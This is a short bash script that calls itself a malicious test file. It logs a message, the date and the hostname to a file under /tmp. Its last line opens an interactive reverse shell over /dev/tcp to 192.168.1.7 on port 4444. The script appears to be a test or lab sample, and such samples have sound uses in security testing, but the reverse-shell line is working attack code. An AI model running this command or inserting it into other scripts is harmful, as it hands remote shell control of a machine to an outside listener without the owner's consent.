#!/bin/bash

# This is a malicious script that executes arbitrary commands
echo "This is a test of a malicious file" >> /tmp/malicious_log.txt
date >> /tmp/malicious_log.txt
hostname >> /tmp/malicious_log.txt

# Reverse Shell
bash -i >& /dev/tcp/192.168.1.7/4444 0>&1
